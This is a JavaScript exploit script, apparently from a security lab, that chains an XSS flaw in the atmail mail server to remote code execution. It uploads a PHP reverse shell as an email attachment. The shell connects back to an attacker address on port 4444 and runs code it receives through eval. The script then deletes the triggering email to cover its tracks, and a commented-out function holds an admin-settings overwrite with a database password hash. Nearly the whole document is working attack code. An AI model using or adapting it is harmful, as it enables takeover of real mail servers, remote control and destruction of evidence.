// Author Youssef B.
// Trigger the xss to an RCE
// Vulnerability found in atmail mail server

var jsonresp;

function read_body(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }

    return data;
}

function get_mailid()
{
    var uri = "http://atmail/index.php/mail/mail/listfoldermessages/selectFolder/INBOX";

    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
            var body = read_body(xhr);
            jsonresp = JSON.parse(body);
        }

        target = jsonresp.q[1].a[0][0];

        var wrapper = document.createElement('div');
        wrapper.innerHTML= target;
    
        var x = document.getElementsByName("mailId[]");
        if (x[0].type == "checkbox") {
            mailid = x[0].value;
        }
    }
    xhr.open("GET", uri, true);
    xhr.send(null);

    return mailid;
}

function delete_mail(mailid) {
    var uri = "http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
    var query_string = "?mailId[]=" + mailid;

    var url = "http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX.Trash/toFolder/INBOX.Trash/actuallyDelete/1";
    var query_string2 = "?mailId[]=" + mailid;

    var xdelm = new XMLHttpRequest();
    xdelm.open("GET", uri + query_string, true);
    xdelm.send(null);

    var xerase = new XMLHttpRequest();
    xerase.open("GET", url + query_string2, true);
    xerase.send(null);
}

// function pwnSettingtmpFolderBaseName()
// {
//     var xhttp = new XMLHttpRequest();
//     xhttp.open("POST", "http://atmail/index.php/admin/settings/globalsave", true);
//     xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlenconded");
//     xhttp.send("save=1&fields[sql_user]=root&fields[sql_pass]=956ec84a45e0675851367c7e480ec0e9&fields[sql_table]=atmail6&fields[tmpFolderBaseName]=");
// }

function generateBoundary()
{
    return Math.random().toString(8).slice(-15);
}

function uploadAllTheThings()
{
    // embed the reverse shell
    var phpKode = "/*<?php /**/ error_reporting(0); $ip = '192.168.119.150'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();"
    var b = generateBoundary();
    var boundary = "--------------------------------" + b;
    var uri = "http://atmail/index.php/mail/composemessage/addattachment/composeID/";

    xhr = new XMLHttpRequest();
    xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary);
    xhr.withCredentials = "true";

    var body = "";
    body += "--" + boundary + "\r\n";
    body += 'Content-Disposition: form-data; name="newAttachment"; filename="shell.php"\r\n';
    body += "Content-Type:   \r\n\r\n";
    body += phpKode + "\r\n";
    body += "--" + boundary + "--";

    xhr.send(body);


    var mid = get_mailid();
    delete_mail(mid);
    return true;
}

// pwnSettingtmpFolderBaseName();
setTimeout(uploadAllTheThings,2000);
